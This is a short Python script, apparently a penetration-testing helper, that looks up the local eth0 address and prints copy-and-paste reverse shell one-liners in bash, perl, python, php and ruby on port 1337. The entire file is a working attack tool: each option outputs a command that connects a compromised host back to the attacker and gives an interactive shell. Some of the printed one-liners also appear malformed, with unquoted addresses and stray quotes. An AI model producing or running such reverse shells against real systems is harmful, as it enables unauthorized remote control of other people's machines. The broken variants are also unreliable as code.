#SCRIPT WHERE YOU CAN GET BASIC REVERSE SHELL TO ONLY COPY AND PASTE.
#MADE BY REFCRY
import argparse
import sys
import socket
import netifaces as ni

#IF YOU HAVE ANOTHER INTERTNET INTERFACE CHANGE eth0
def getIp():
    try:
        ni.ifaddresses('eth0')
        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    except:
        print('eth0 interface not found. It need to be change in the script')
    return ip


#OPTIONS 
def getOptions(args=sys.argv[1:]):
    parser = argparse.ArgumentParser(description="REVERSE SHELL TOOK FROM PENTESTMONKEY.COM")
    parser.add_argument("-b", "--bash", action='store_true', help="Show reverse shell with bash")
    parser.add_argument("-pe", "--perl", action='store_true', help="Show reverse shell with perl")
    parser.add_argument("-py", "--python",  action='store_true', help="Show reverse shell with python")
    parser.add_argument("-ph", "--php", action='store_true', help="Show reverse shell with php")
    parser.add_argument("-r", "--ruby", action='store_true', help="Show reverse shell with ruby")
    options = parser.parse_args(args)
    return options

ipAdd = getIp()
port = "1337" #CHANGE IF YOU WANT TO USE OTHER PORT
options = getOptions(sys.argv[1:])
#BASIC REVERSE SHELL CONFIGURATION, THIS COULD BE CHANGED.
try:
    if options.bash: 
        print("bash -i >& /dev/tcp/"+ipAdd+"/"+port+" 0>&1")
    elif options.perl:
       print('''perl -e 'use Socket;$i="'''+ipAdd+'''";$p='''+port+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"''') 
    elif options.python:
        print('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+ipAdd+''','''+port+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"''') 
    elif options.php:
        print('''php -r '$sock=fsockopen('''+ipAdd+''','''+port+''');exec("/bin/sh -i <&3 >&3 2>&3");'"''')
    elif options.ruby:
        print("""ruby -rsocket -e'f=TCPSocket.open("""+ipAdd+""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
    else:
        getOptions()
        print ('''RUN "python '''+sys.argv[0]+''' --help" FOR MORE INFORMATION''')
        print("CHOOSE A REVERSE SHELL OPTION")
except:
    getOptions()
    print("VERIFY YOUR INPUT DATA")
    print ('''RUN "python '''+sys.argv[0]+''' --help" FOR MORE INFORMATION''')

